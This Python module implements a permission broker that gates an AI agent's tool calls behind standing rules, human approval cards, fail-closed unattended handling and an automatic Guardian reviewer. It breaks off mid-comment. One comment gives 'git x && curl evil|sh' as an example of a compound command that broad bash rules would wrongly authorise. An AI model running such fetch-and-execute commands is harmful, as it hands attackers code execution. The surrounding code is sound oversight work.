"""Process-wide tool-call permission broker (opencode-style approval gate).

Every ``HostDispatcher.__call__`` for a risk-bearing tool consults the singleton
``broker()`` via :meth:`PermissionBroker.gate`. The gate resolves the call
against the persisted rules (see :meth:`Store.resolve_permission`) and:

* ``allow`` → returns immediately;
* ``deny``  → returns a soft-fail the model can recover from;
* ``ask``   → persists a concrete approval request, emits an
  ``await_permission`` event when a UI channel exists, and BLOCKS the daemon
  turn until the user answers, the turn is cancelled, or the request expires.
  Headless/unattended execution fails closed by default; an operator must set
  ``OPENAI4S_UNATTENDED_APPROVAL=allow`` to opt into fail-open behaviour.

The broker is keyed by ``root_frame_id`` so the SAME dispatcher (foreground +
background cells) and any nested/delegated dispatcher all gate uniformly and
their prompts surface in the one conversation the user is watching — without the
delegation subsystem needing to know anything about the gate.
"""

from __future__ import annotations

import hashlib
import os
import re
import threading
import time
import uuid
from typing import Any, Callable

_SCOPES = ("once", "conversation", "project", "global")
_TRUE = frozenset({"1", "true", "yes", "on"})


def _scope(value: str | None) -> str:
    return value if value in _SCOPES else "once"


def _daemon_config():
    """The process config, for the Guardian's feature flags and budgets."""

    from openai4s.config import get_config

    return get_config()


def _recomputed_action_digest(request) -> str | None:
    """Re-derive the request row's canonical action digest, or None.

    Deliberately the Store's own canonicalization rather than a second one:
    the digest Guardian binds to has to be the digest
    ``resolve_permission_request`` will CAS against, or the approval is bound
    to something the store never agreed to. None on any failure -- an envelope
    we cannot re-derive is one we cannot vouch for.
    """

    try:
        from openai4s.storage.permissions import canonical_permission_action_digest

        return canonical_permission_action_digest(request)
    except Exception:  # noqa: BLE001 — unverifiable is not approvable
        return None


def _guardian_hard_deny(
    store,
    *,
    root_frame_id: str | None,
    project_id: str,
    tool: str,
    target: str,
) -> bool:
    """Whether an existing hard policy already refuses this exact action.

    The Guardian is the LAST line, not the first: sandbox, egress, secret and
    standing-deny decisions outrank it, and an allow it issues over the top of
    one of them would be the model widening its own authority. Anything we
    cannot evaluate counts as a deny, because "we could not check" is not
    evidence that the action is safe.
    """

    if "://" in target:
        # Guarded on a scheme because `egress.domain_of` reads ANY bare string
        # as a hostname: `domain_of("notes.txt")` is `"notes.txt"`. Without this,
        # every relative file read was refused as "denied by an existing hard
        # policy" whenever OPENAI4S_EGRESS=allowlist -- a false denial that also
        # wrote a durable audit row naming a policy that never issued.
        try:
            from openai4s.egress import domain_allowed

            if not domain_allowed(target):
                return True
        except Exception:  # noqa: BLE001
            return True
    try:
        if (
            store.resolve_permission(
                root_frame_id=root_frame_id,
                project_id=project_id,
                tool=tool,
                pattern_input=target,
            )
            == "deny"
        ):
            return True
    except Exception:  # noqa: BLE001
        return True
    return False


def _guardian_denial_history(store, root_frame_id: str | None) -> list[bool]:
    """Rebuild the non-structural Guardian breaker from durable requests."""

    if not root_frame_id:
        return []
    rows = store.list_permission_requests(root_frame_id=root_frame_id)
    return [
        str(row.get("state") or "") != "allowed"
        for row in rows
        if row.get("resolution_context") == "guardian"
        and row.get("state") in {"allowed", "denied"}
    ]


def _active_auto_mode_run_for_permission(
    store, root_frame_id: str | None, request: dict
) -> dict | None:
    """Return the exact active Auto Run owning this permission action."""

    if not root_frame_id:
        return None
    action_group_id = str(request.get("action_group_id") or "")
    if not action_group_id:
        return None
    group = store.get_action_group(action_group_id, include_events=False)
    if not isinstance(group, dict):
        return None
    branch_id = str(group.get("branch_id") or "")
    turn_id = str(group.get("turn_id") or "")
    if not branch_id or not turn_id or group.get("root_frame_id") != root_frame_id:
        return None
    projection = store.project_auto_mode_run(root_frame_id, branch_id)
    run = projection.get("run") if isinstance(projection, dict) else None
    if not isinstance(run, dict):
        return None
    if (
        run.get("root_frame_id") != root_frame_id
        or run.get("branch_id") != branch_id
        or run.get("turn_id") != turn_id
        or run.get("finished_at") is not None
        or run.get("status")
        in {
            "verified",
            "completed_with_issues",
            "review_unavailable",
            "blocked_by_guardian",
            "cancelled",
            "failed",
            "paused",
            "unverified_import",
        }
    ):
        return None
    return run


def _start_guardian_assessment(
    store,
    *,
    root_frame_id: str | None,
    request: dict,
) -> dict | None:
    """Open the Auto Mode audit owner before Guardian evaluates the action."""

    run = _active_auto_mode_run_for_permission(store, root_frame_id, request)
    if run is None:
        return None
    decision_id = str(request.get("decision_id") or "")
    action_digest = str(request.get("action_digest") or "")
    token = hashlib.sha256(
        f"{decision_id}|{action_digest}".encode("utf-8")
    ).hexdigest()[:24]
    assessment_id = f"guardian-{token}"
    transition = store.start_permission_review_assessment(
        str(run["run_id"]),
        assessment_id=assessment_id,
        audit_id=f"audit-guardian-{token}",
        decision_id=decision_id,
        action_digest=action_digest,
        policy_version="guardian-enforce-v1",
        idempotency_key=f"guardian:{decision_id}:start",
    )
    durable_assessment_id = str(transition.get("assessment_id") or "")
    durable_run_id = str(transition.get("run_id") or "")
    durable_audit_id = str(transition.get("audit_id") or "")
    if (
        durable_assessment_id != assessment_id
        or durable_run_id != str(run["run_id"])
        or not durable_audit_id
    ):
        raise RuntimeError("guardian assessment start identity is invalid")
    return {
        "assessment_id": durable_assessment_id,
        "run_id": durable_run_id,
        "audit_id": durable_audit_id,
        "transition": transition,
    }


def _complete_guardian_assessment(
    store,
    assessment: dict | None,
    *,
    decision: tuple[bool, str],
    dangerous: bool,
    structural: bool,
) -> str | None:
    if assessment is None:
        return None
    allowed, message = decision
    transition = store.complete_permission_review_assessment(
        str(assessment["assessment_id"]),
        idempotency_key=(f"guardian:{assessment['assessment_id']}:complete"),
        status="completed",
        outcome="allow_once" if allowed else "deny",
        risk=("critical" if dangerous else ("unknown" if structural else "high")),
        assessment={
            "schema_version": 1,
            "policy_version": "guardian-enforce-v1",
            "public_summary": str(message)[:1000],
            "structural": bool(structural),
        },
    )
    audit_id = str(transition.get("audit_id") or "")
    if (
        str(transition.get("assessment_id") or "") != str(assessment["assessment_id"])
        or str(transition.get("run_id") or "") != str(assessment["run_id"])
        or audit_id != str(assessment["audit_id"])
    ):
        raise RuntimeError("guardian assessment completion identity is invalid")
    return audit_id


def _stage7_auto_review_requested(
    config: Any = None, approvals_reviewer: str | None = None
) -> bool:
    """Freeze Stage 7 selection before importing its policy predicate.

    A predicate/import failure must not erase a config-only selection and turn
    a gentle default ``allow`` into a fail-open. This mirrors
    ``guardian_enforce.feature_enabled`` + ``auto_review_requested`` without
    depending on the module whose later policy check may fail.
    """

    stage7_env = (
        os.environ.get("OPENAI4S_STAGE7_GUARDIAN_ENFORCEMENT", "").strip().lower()
        in _TRUE
    )
    auto_env = (
        os.environ.get("OPENAI4S_UNATTENDED_APPROVAL", "deny").strip().lower()
        == "auto_review"
    )
    selection = str(approvals_reviewer or "")
    try:
        flags = getattr(config, "roadmap_features", None)
        stage7 = (
            bool(getattr(flags, "stage7_guardian_enforcement", False))
            if flags is not None
            else stage7_env
        )
        if not selection:
            auto = getattr(config, "auto_mode", None)
            configured = str(getattr(auto, "approvals_reviewer", "") or "")
            explicit_fields = getattr(auto, "deployment_explicit_fields", None)
            if (
                explicit_fields is None
                or bool(getattr(auto, "enabled", False))
                or (
                    "approvals_reviewer" in explicit_fields
                    or "preset" in explicit_fields
                )
            ):
                selection = configured
    except Exception:  # noqa: BLE001 - malformed config cannot weaken env policy
        return stage7_env and auto_env
    requested = selection == "auto_review" if selection else auto_env
    return stage7 and requested


def _unattended_file_policy_reason(
    *,
    enabled: bool,
    tool: str,
    target: str,
    canonical_arguments: Any,
    resolved_file_path: str | None,
    resolved_file_is_credential: bool,
) -> str | None:
    if not enabled:
        return None
    try:
        from openai4s.server.guardian_enforce import unattended_file_deny_reason

        return unattended_file_deny_reason(
            tool=tool,
            target=target,
            canonical_arguments=canonical_arguments,
            resolved_file_path=resolved_file_path,
            resolved_file_is_credential=resolved_file_is_credential,
        )
    except Exception:  # noqa: BLE001 - automatic review verification fails closed
        return "unattended file policy could not verify access"


def _file_policy_review_kind(reason: str) -> str:
    """Stable UI category for one deterministic file-policy rationale."""

    if "credential path" in reason:
        return "credential_path"
    if "data-dependent file search" in reason:
        return "dynamic_file_search"
    if "without a reviewable path" in reason:
        return "unreviewable_path"
    return "verification_failed"


def _safe_resolved_review_path(value: str | None) -> str | None:
    """Keep only a bounded workspace-relative path for an approval card."""

    normalized = str(value or "").replace("\\", "/")
    if (
        not normalized
        or normalized.startswith("/")
        or re.match(r"^[A-Za-z]:/", normalized)
        or any(part == ".." for part in normalized.split("/"))
    ):
        return None
    return normalized[:1000]


def _restart_resolution_marker(store, request: dict, *, allow: bool) -> bool:
    """Append an idempotent, argument-free restart decision to the ledger.

    Permission payloads may be redacted or incomplete and are never replayable
    execution input.  This marker only teaches the next model turn the one fact
    it may rely on: the old action did not execute and must be reconsidered.
    """

    decision_id = str(request.get("decision_id") or "")
    root = str(request.get("root_frame_id") or "")
    tool = re.sub(r"[^A-Za-z0-9_.:-]+", "_", str(request.get("tool") or "unknown"))[
        :120
    ]
    if not decision_id or not root:
        return False
    suffix = hashlib.sha256(decision_id.encode("utf-8")).hexdigest()[:16]
    group_id = f"ag-permission-{suffix}"
    event_id = f"ae-permission-{suffix}"
    if allow:
        content = (
            f"[system] A human approved the previously interrupted {tool} "
            "request after the daemon restarted. The original operation did "
            "not execute. Re-evaluate current state and issue a fresh action "
            "only if it is still needed; never assume the old action succeeded."
        )
        result = {
            "status": "requires_continue",
            "allow": True,
            "requires_continue": True,
            "original_action_executed": False,
            "tool": tool,
        }
    else:
        content = (
            f"[system] A human denied the previously interrupted {tool} "
            "request after the daemon restarted. The original operation did "
            "not execute. Do not assume it succeeded."
        )
        result = {
            "status": "denied",
            "allow": False,
            "requires_continue": False,
            "original_action_executed": False,
            "tool": tool,
        }
    try:
        group = store.get_action_group(group_id)
        if group is None:
            try:
                store.append_action_group(
                    root_frame_id=root,
                    turn_id=f"permission-{suffix}",
                    kind="permission_resolution",
                    group_id=group_id,
                    assistant_content=content,
                    assistant_message={"role": "system", "content": content},
                )
            except Exception:  # noqa: BLE001 - retry an idempotent race below
                if store.get_action_group(group_id) is None:
                    raise
            group = store.get_action_group(group_id)
        events = list((group or {}).get("events") or ())
        if not any(event.get("event_id") == event_id for event in events):
            try:
                store.append_action_event(
                    group_id=group_id,
                    event_id=event_id,
                    type="completed" if allow else "denied",
                    result=result,
                    side_effect_class="runtime_mutation",
                    resource_keys=[f"permission:{tool}"],
                )
            except Exception:  # noqa: BLE001 - accept only a completed race
                group = store.get_action_group(group_id)
                if not any(
                    event.get("event_id") == event_id
                    for event in (group or {}).get("events") or ()
                ):
                    raise
        return True
    except Exception:  # noqa: BLE001 - caller keeps continuation disabled
        return False


def suggest_patterns(method: str, target: str) -> list[str]:
    """Offer a few generalizations of a tool target for the 'remember' picker,
    most-specific first (opencode's biggest UX win over storing exact strings)."""
    target = (target or "").strip()
    out: list[str] = []
    if target:
        out.append(target)
    if method == "bash" and target:
        # A '*' in a bash rule spans shell metacharacters, so a broad prefix rule
        # like 'git *' would also authorize 'git x && curl evil|sh'. Only offer
        # prefix generalizations for a SINGLE simple command (no ; && || | ` $()
        # redirects); for a compound command offer just the exact string.
        if not re.search(r"[;&|`]|\$\(|>|<", target):
            toks = target.split()
            if len(toks) >= 2:
                out.append(f"{toks[0]} {toks[1]} *")
            if toks:
                out.append(f"{toks[0]} *")
    elif method in ("write_file", "edit_file", "read_file", "save_artifact") and target:
        # dir/* and *.ext generalizations
        if "/" in target:
            out.append(target.rsplit("/", 1)[0] + "/*")
        if "." in target.rsplit("/", 1)[-1]:
            out.append("*." + target.rsplit(".", 1)[-1])
    elif method == "web_fetch" and target:
        out.append(target)  # already a domain
    elif (
        method in ("mcp_call", "mcp_resource_read", "mcp_prompt_get") and "/" in target
    ):
        out.append(target.split("/", 1)[0] + "/*")
    out.append("*")
    # de-dupe preserving order
    seen: set[str] = set()
    uniq: list[str] = []
    for p in out:
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


class _Pending:
    __slots__ = (
        "event",
        "allow",
        "scope",
        "pattern",
        "message",
        "payload",
        "created_at",
        "store",
        "expected_action_digest",
        "resolution_done",
        "resolution_result",
    )

    def __init__(
        self,
        payload: dict,
        store=None,
        *,
        expected_action_digest: str | None = None,
    ):
        self.event = threading.Event()
        self.allow = False
        self.scope = "once"
        self.pattern: str | None = None
        self.message: str | None = None
        self.payload = payload
        self.created_at = time.time()
        self.store = store
        self.expected_action_digest = expected_action_digest
        self.resolution_done = threading.Event()
        self.resolution_result: dict | None = None


class PermissionBroker:
    DEFAULT_TIMEOUT = (
        900.0  # 15 min — backstop so a never-answered prompt frees the turn
    )
    _POLL = 0.5
    #: How long the HTTP decision thread waits for the tool thread's durable
    #: acknowledgement before answering "still committing". Generous enough to
    #: cover a slow SQLite writer holding the Store lock, short enough that a
    #: lost tool thread cannot retire a server thread permanently.
    RESOLVE_ACK_TIMEOUT = 30.0

    def __init__(self) -> None:
        #: How the broker learns which approvals reviewer a conversation
        #: actually selected. This is a PORT, not an import: the durable
        #: selection is Web-session state owned by ``openai4s/server/``, while
        #: the broker is core infrastructure the CLI shares. Reaching into the
        #: server package from here would invert the dependency, and
        #: ``tests/test_config.py`` asserts that boundary. The server registers
        #: its adapter at startup; the CLI, which has no such state, leaves it
        #: unset and the operator's environment decides -- the only thing there
        #: is to decide from in a one-shot run.
        self._selection_resolver: Callable[[Any, str, str], str] | None = None
        self._lock = threading.RLock()
        self._channels: dict[str, dict] = {}  # root_frame_id -> {emit, cancel}
        self._pending: dict[str, _Pending] = {}  # decision_id -> _Pending
        self._by_root: dict[str, set[str]] = {}  # root_frame_id -> {decision_id}

    # --- UI channel registration (called by the web gateway) --------------
    def register_channel(
        self,
        root_frame_id: str,
        emit: Callable[[dict], Any],
        cancel_event: threading.Event | None = None,
        watching: Callable[[], bool] | None = None,
        guardian_terminal: Callable[[str], Any] | None = None,
        store=None,
    ) -> None:
        # `watching` is UI metadata only. Approval correctness never depends on
        # a subscriber being present: unwatched requests remain durably pending.
        with self._lock:
            self._channels[root_frame_id] = {
                "emit": emit,
                "cancel": cancel_event,
                "watching": watching,
                "guardian_terminal": guardian_terminal,
                "store": store,
            }

    @staticmethod
    def _notify_guardian_terminal(channel: dict | None, message: str) -> None:
        callback = channel.get("guardian_terminal") if channel is not None else None
        if not callable(callback):
            return
        try:
            callback(str(message))
        except Exception:  # noqa: BLE001 - the permission refusal already stands
            pass

    def unregister_channel(self, root_frame_id: str) -> None:
        with self._lock:
            self._channels.pop(root_frame_id, None)

    def pending_events(self, root_frame_id: str, *, store=None) -> list[dict]:
        """Outstanding await_permission payloads for a conversation (for a
        client reconnecting mid-pause)."""
        with self._lock:
            memory = [
                self._pending[d].payload
                for d in self._by_root.get(root_frame_id, ())
                if d in self._pending
            ]
            channel = self._channels.get(root_frame_id) or {}
            store = store or channel.get("store")
        if store is None:
            return memory
        seen = {item.get("decision_id") for item in memory}
        try:
            durable = [
                row.get("payload") or {}
                for row in store.list_permission_requests(
                    root_frame_id=root_frame_id,
                    state="pending",
                )
                if row.get("decision_id") not in seen
            ]
        except Exception:  # noqa: BLE001 — reconnect must remain available
            durable = []
        return memory + durable

    def is_pending(self, root_frame_id: str) -> bool:
        """Whether a tool call is currently blocked awaiting approval for this
        conversation. The cell watchdog uses this to freeze its clock so a slow
        human approval is not mistaken for a wedged cell."""
        with self._lock:
            return bool(self._by_root.get(root_frame_id))

    def set_approvals_reviewer_resolver(
        self, resolver: Callable[[Any, str, str], str] | None
    ) -> None:
        """Register how to resolve a conversation's ``approvals_reviewer``.

        The resolver takes ``(store, root_frame_id, project_id)`` and returns
        the effective selection, honouring import quarantine and the legacy
        ``review:auto:*`` migration.
        """

        with self._lock:
            self._selection_resolver = resolver

    def _approvals_reviewer(
        self, store, root_frame_id: str | None, project_id: str
    ) -> str:
        """The conversation's effective approvals reviewer, or "" if unknown.

        A registered resolver that RAISES resolves to ``"user"`` -- the
        fail-closed answer -- because "we could not tell" is not consent. No
        resolver at all is a different statement: nothing in this process owns
        a durable selection, so the operator's environment is the only
        expressed intent there is.
        """

        with self._lock:
            resolver = self._selection_resolver
        if resolver is None:
            return ""
        try:
            return str(resolver(store, str(root_frame_id or ""), project_id) or "")
        except Exception:  # noqa: BLE001 — an unreadable selection is not consent
            return "user"

    @staticmethod
    def _permission_scope(
        store, frame_id: str | None, project_id: str | None
    ) -> tuple[str | None, str | None]:
        """Resolve the root conversation and project for one gated action."""

        root = frame_id
        proj = project_id
        try:
            if frame_id:
                fr = store.get_frame(frame_id)
                if fr:
                    root = fr.get("root_frame_id") or frame_id
                    proj = proj or fr.get("project_id") or "default"
                # A delegated sub-agent's child frame carries
                # project_id='default'; resolve the project from the ROOT
                # conversation frame so project-scoped rules and selection
                # both follow the parent conversation.
                if root and root != frame_id:
                    rfr = store.get_frame(root)
                    if rfr and rfr.get("project_id"):
                        proj = rfr.get("project_id")
        except Exception:  # noqa: BLE001 — an unresolved scope never grants consent
            pass
        return root, proj

    def approvals_reviewer_for(
        self,
        *,
        store,
        frame_id: str | None,
        project_id: str | None = None,
    ) -> str:
        """Return the exact effective reviewer the next gate will consume.

        Host-side file alias review must happen before the broker is called,
        because it needs the workspace service. Exposing only the resolved
        selection keeps that helper independent of Store while letting both
        checks consume one value rather than independently guessing from the
        daemon configuration.
        """

        root, proj = self._permission_scope(store, frame_id, project_id)
        return self._approvals_reviewer(store, root, proj or "default")

    def _resolve_guardian_decision(
        self,
        store,
        *,
        decision_id: str,
        root: str | None,
        chan: dict | None,
        created_request: dict,
        decision: tuple[bool, str],
        audit_id: str | None = None,
        structural: bool = False,
        circuit_open: bool = False,
    ) -> dict:
        """Commit one Guardian verdict and tell the UI, if anyone is watching.

        The durable resolution is the decision; the event is only how a browser
        finds out. A CAS failure here downgrades to deny, because an approval
        the store would not commit is not an approval.
        """

        allowed, message = decision
        state = "allowed" if allowed else "denied"
        try:
            resolved = store.resolve_permission_request(
                decision_id,
                state=state,
                scope="once",
                message=message,
                resolution_context=(
                    "guardian_structural" if structural else "guardian"
                ),
                expected_action_digest=(
                    created_request.get("action_digest") if allowed else None
                ),
            )
            allowed = bool(allowed and resolved.get("state") == "allowed")
            actual_state = str(resolved.get("state") or state)
            if state == "allowed" and not allowed:
                message = "approval expired before it could be committed"
        except Exception:  # noqa: BLE001 — an uncommittable approval is a denial
            allowed = False
            actual_state = "failed"
            message = "approval persistence failed closed"
        if circuit_open:
            # Only after the exact permission verdict is durable.  The Web
            # adapter atomically closes the owning Auto Run; if its event is
            # lost, the durable denial history still makes every later gate
            # reconstruct the same open circuit after restart.
            self._notify_guardian_terminal(chan, message)
        if chan is not None:
            # Same event the human path emits, so an open browser sees the card
            # resolve instead of waiting on an answer that already happened.
            try:
                event = {
                    "type": "permission_resolved",
                    "frame_id": root,
                    "decision_id": decision_id,
                    "allow": allowed,
                    "scope": "once",
                    "state": actual_state,
                    "resolution_actor": "guardian",
                }
                if audit_id:
                    event["audit_id"] = audit_id
                chan["emit"](event)
            except Exception:  # noqa: BLE001 — delivery is not the decision
                pass
        return {
            "allow": allowed,
            "decision_id": decision_id,
            **({} if allowed else {"message": message}),
        }

    # --- the gate (called by HostDispatcher, on the turn thread) ----------
    def gate(
        self,
        *,
        store,
        frame_id: str | None,
        method: str,
        target: str = "",
        view: tuple | None = None,
        project_id: str | None = None,
        action_group_id: str | None = None,
        action_id: str | None = None,
        tool_call_id: str | None = None,
        side_effect_class: str | None = None,
        resource_keys: list[str] | tuple[str, ...] | None = None,
        dangerous: bool = False,
        canonical_arguments: Any = None,
        resolved_file_path: str | None = None,
        resolved_file_is_credential: bool = False,
        guardian_config: Any = None,
        approvals_reviewer: str | None = None,
        timeout: float | None = None,
    ) -> dict:
        # Resolve the conversation identity + project from the dispatcher's frame
        # (works for root, background and delegated child dispatchers alike).
        root, proj = self._permission_scope(store, frame_id, project_id)
        try:
            decision = store.resolve_permission(
                root_frame_id=root,
                project_id=proj or "default",
                tool=method,
                pattern_input=target,
            )
        except Exception:  # noqa: BLE001
            decision = "ask"
        if approvals_reviewer is None:
            approvals_reviewer = self._approvals_reviewer(
                store, root, proj or "default"
            )
        guardian_requested = _stage7_auto_review_requested(
            guardian_config, approvals_reviewer
        )
        guardian_history: list[bool] = []
        with self._lock:
            guardian_channel = self._channels.get(root)
        if guardian_requested:
            try:
                from openai4s.server.guardian_enforce import denial_circuit_open

                circuit_config = guardian_config or _daemon_config()
                guardian_history = _guardian_denial_history(store, root)
                if denial_circuit_open(guardian_history, config=circuit_config):
                    message = "guardian circuit open: blocked_by_guardian"
                    self._notify_guardian_terminal(guardian_channel, message)
                    return {"allow": False, "message": message}
            except Exception:  # noqa: BLE001 - unreadable breaker never permits work
                return {
                    "allow": False,
                    "message": "guardian denial history failed closed",
                }
        file_policy_reason = _unattended_file_policy_reason(
            enabled=guardian_requested,
            tool=method,
            target=target,
            canonical_arguments=canonical_arguments,
            resolved_file_path=resolved_file_path,
            resolved_file_is_credential=resolved_file_is_credential,
        )
        if decision == "allow":
            if file_policy_reason is not None:
                # The gentle defaults allow routine workspace file tools.
                # Upgrade a review-fence match to `ask`: an attached channel
                # gets a real human fallback; a headless run records and
                # refuses the deterministic policy match.
                decision = "ask"
            if decision == "allow":
                return {"allow": True}
        if decision == "deny":
            return {
                "allow": False,
                "message": "blocked by a standing 'deny' permission rule",
            }
        restart_once_grant = None
        if file_policy_reason is None:
            try:
                if root:
                    restart_once_grant = store.consume_restart_permission_grant(
                        root_frame_id=root,
                        project_id=proj or "default",
                        tool=method,
                        target=target,
                        side_effect_class=side_effect_class,
                        resource_keys=resource_keys,
                        dangerous=dangerous,
                        canonical_arguments=canonical_arguments,
                    )
            except Exception:  # noqa: BLE001 - an unusable grant never fails open
                restart_once_grant = None
        if restart_once_grant is not None:
            return {
                "allow": True,
                "continuation_decision_id": restart_once_grant.get("decision_id"),
            }

        # decision == "ask": allocate the durable identity before deciding how
        # the caller will wait, so even a headless denial is auditable.
        did = "perm-" + uuid.uuid4().hex[:12]
        kind = view[0] if view else method
        title = view[1] if view else method
        inp = view[2] if (view and len(view) > 2) else {}
        payload = {
            "type": "await_permission",
            "frame_id": root,
            "decision_id": did,
            "tool": method,
            "kind": kind,
            "title": title,
            "input": inp,
            "target": target,
            "suggested_patterns": suggest_patterns(method, target),
            "scopes": list(_SCOPES),
            "sub_agent": bool(frame_id and root and frame_id != root),
            "action_group_id": action_group_id,
            "action_id": action_id,
            "tool_call_id": tool_call_id,
            "side_effect_class": side_effect_class,
            "resource_keys": list(resource_keys or ()),
            # The tool's own risk declaration, so the card can ask for a
            # dangerous capability differently than for a file read. Carried in
            # the payload rather than a new column: the payload is stored with
            # the request, so the durable record and any replay of it keep the
            # fact without a migration.
            "dangerous": bool(dangerous),
        }
        if file_policy_reason is not None:
            # The standing rule stays bound to the raw permission target. The
            # approval card additionally needs the reason automatic review
            # stopped and the safe, workspace-relative destination: otherwise
            # `notes.txt -> config.json` asks a human to approve only the
            # innocuous alias and hides the fact they actually need to judge.
            payload["policy_review_kind"] = _file_policy_review_kind(file_policy_reason)
            payload["policy_review_reason"] = file_policy_reason
            review_path = _safe_resolved_review_path(resolved_file_path)
            if review_path is not None:
                payload["resolved_file_path"] = review_path
        wait_seconds = timeout if timeout is not None else self.DEFAULT_TIMEOUT
        try:
            created_request = store.create_permission_request(
                decision_id=did,
                root_frame_id=root,
                frame_id=frame_id,
                project_id=proj or "default",
                action_group_id=action_group_id,
                action_id=action_id,
                tool_call_id=tool_call_id,
                side_effect_class=side_effect_class,
                resource_keys=resource_keys,
                tool=method,
                target=target,
                payload=payload,
                dangerous=dangerous,
                canonical_arguments=canonical_arguments,
                expires_at=int((time.time() + wait_seconds) * 1000),
            )
        except Exception:  # noqa: BLE001 — inability to audit must fail closed
            return {
                "allow": False,
                "message": "approval required but its durable request could not be recorded",
            }
        with self._lock:
            chan = self._channels.get(root)
            if chan is not None and chan.get("store") is None:
                chan["store"] = store
        unattended_policy_reason = file_policy_reason if chan is None else None
        try:
            from openai4s.server.guardian_shadow import maybe_record_shadow

            maybe_record_shadow(
                store,
                created_request,
                payload,
                config=guardian_config,
                canonical_arguments=canonical_arguments,
                hard_deny=unattended_policy_reason is not None,
                hard_deny_reason=unattended_policy_reason,
            )
        except Exception:  # noqa: BLE001 - shadow must not block the ask
            pass

        # Guardian is consulted BEFORE the channel is considered. A session that
        # selected `approvals_reviewer=auto_review` asked not to wait for a
        # human, and a browser being open does not withdraw that: gating the
        # consult on `chan is None` meant Web Auto Mode still parked on an
        # approval card, so the mode did nothing in the surface where it is
        # actually configured. `approvals_reviewer=user` is the human-card path,
        # and it stays exactly that -- `decide_unattended` returns a denial for
        # a recorded `user` and None when nobody recorded anything.
        guardian_decision = None
        guardian_meta: dict[str, bool] = {}
        guardian_assessment: dict | None = None
        guardian_required = os.environ.get(
            "OPENAI4S_STAGE7_GUARDIAN_ENFORCEMENT", ""
        ).strip().lower() in {"1", "true", "yes", "on"}
        try:
            from openai4s.server.guardian_enforce import (
                decide_unattended,
            )
            from openai4s.server.guardian_enforce import (
                feature_enabled as guardian_feature_enabled,
            )

            guardian_config = guardian_config or _daemon_config()
            guardian_required = guardian_feature_enabled(guardian_config)
            if guardian_requested and file_policy_reason is None:
                guardian_assessment = _start_guardian_assessment(
                    store,
                    root_frame_id=root,
                    request=created_request,
                )

            # The Guardian is asked about the DURABLE action, not the UI
            # projection: `action_digest` is what `resolve_permission_request`
            # will CAS against below, so binding the approval to anything
            # else would grant permission for an action the store cannot
            # confirm. `canonical_arguments` likewise comes from the row,
            # not from `payload["input"]`, which is truncated and redacted.
            if file_policy_reason is None:
                guardian_decision = decide_unattended(
                    {
                        **payload,
                        "canonical_arguments": canonical_arguments,
                    },
                    canonical_arguments=canonical_arguments,
                    resolved_file_path=resolved_file_path,
                    resolved_file_is_credential=resolved_file_is_credential,
                    config=guardian_config,
                    approvals_reviewer=approvals_reviewer,
                    expected_digest=created_request.get("action_digest"),
                    # The SAME envelope the Store hashes, hashed again from the
                    # row's own fields. Guardian compares the two: one identity
                    # for the action, not a second one that could never agree
                    # with the durable record it claims to bind.
                    recomputed_digest=_recomputed_action_digest(created_request),
                    hard_deny=_guardian_hard_deny(
                        store,
                        root_frame_id=root,
                        project_id=proj or "default",
                        tool=method,
                        target=target,
                    ),
                    audit_persisted=bool(created_request.get("decision_id")),
                    circuit_key=str(root or did),
                    denial_history=guardian_history,
                    decision_meta=guardian_meta,
                    # Only the broker knows whether anyone is actually there to ask.
                    interactive=chan is not None,
                )
        except Exception:  # noqa: BLE001 - an enabled Guardian never fails open
            guardian_decision = (
                (False, "guardian evaluation failed closed")
                if guardian_required
                else None
            )
            if guardian_decision is not None:
                guardian_meta = {"structural": False, "circuit_open": False}
                try:
                    from openai4s.server.guardian_enforce import denial_circuit_open

                    guardian_meta["circuit_open"] = denial_circuit_open(
                        [*guardian_history, True], config=guardian_config
                    )
                except Exception:  # noqa: BLE001 - the decision remains a denial
                    pass

        if guardian_decision is not None:
            guardian_audit_id: str | None = None
            try:
                guardian_audit_id = _complete_guardian_assessment(
                    store,
                    guardian_assessment,
                    decision=guardian_decision,
                    dangerous=bool(dangerous),
                    structural=bool(guardian_meta.get("structural")),
                )
            except Exception:  # noqa: BLE001 - uncommitted audit can never allow
                guardian_decision = (
                    False,
                    "guardian assessment persistence failed closed",
                )
                guardian_meta["structural"] = False
                try:
                    from openai4s.server.guardian_enforce import denial_circuit_open

                    guardian_meta["circuit_open"] = denial_circuit_open(
                        [*guardian_history, True], config=guardian_config
                    )
                except Exception:  # noqa: BLE001 - refusal remains authoritative
                    guardian_meta["circuit_open"] = False
            return self._resolve_guardian_decision(
                store,
                decision_id=did,
                root=root,
                chan=chan,
                created_request=created_request,
                decision=guardian_decision,
                audit_id=guardian_audit_id,
                structural=bool(guardian_meta.get("structural")),
                circuit_open=bool(guardian_meta.get("circuit_open")),
            )

        if chan is None:
            unattended = (
                os.environ.get("OPENAI4S_UNATTENDED_APPROVAL", "deny").strip().lower()
            )
            if unattended_policy_reason is not None:
                allowed = False
                message = unattended_policy_reason
            elif guardian_requested:
                allowed = False
                message = "automatic approval review failed closed"
            else:
                allowed = unattended == "allow"
                message = (
                    "allowed by explicit unattended approval policy"
                    if allowed
                    else "approval required but no interactive channel is attached"
                )
            state = "allowed" if allowed else "denied"
            try:
                resolved_request = store.resolve_permission_request(
                    did,
                    state=state,
                    scope="once",
                    message=message,
                    resolution_context="unattended",
                    expected_action_digest=(
                        created_request.get("action_digest") if allowed else None
                    ),
                )
                allowed = bool(allowed and resolved_request.get("state") == "allowed")
                if state == "allowed" and not allowed:
                    message = "approval expired before it could be committed"
            except Exception:  # noqa: BLE001
                allowed = False
                message = "approval persistence failed closed"
            return {
                "allow": allowed,
                "decision_id": did,
                **({} if allowed else {"message": message}),
            }

        cancel_ev = chan.get("cancel")
        if cancel_ev is not None and cancel_ev.is_set():
            try:
                store.resolve_permission_request(
                    did,
                    state="cancelled",
                    scope="once",
                    message="turn cancelled",
                    resolution_context="live_thread",
                )
            except Exception:  # noqa: BLE001
                pass
            return {"allow": False, "message": "turn cancelled"}

        pend = _Pending(
            payload,
            store=store,
            expected_action_digest=created_request.get("action_digest"),
        )
        with self._lock:
            self._pending[did] = pend
            self._by_root.setdefault(root, set()).add(did)
        try:
            chan["emit"](payload)
        except Exception:  # noqa: BLE001
            pass

        deadline = time.time() + wait_seconds
        effective_allow = False
        actual_state = ""
        resolution_error: str | None = None
        # Everything from here to the resolved-event emit runs under a
        # `finally`. The three invariants it guarantees -- the pending entry
        # is removed, the HTTP waiter is released, and the decision is
        # published -- were previously straight-line code, so any abnormal
        # exit (daemon shutdown KeyboardInterrupt, a raise in the durable
        # write) leaked `_by_root`. That leak pins `is_pending()` True
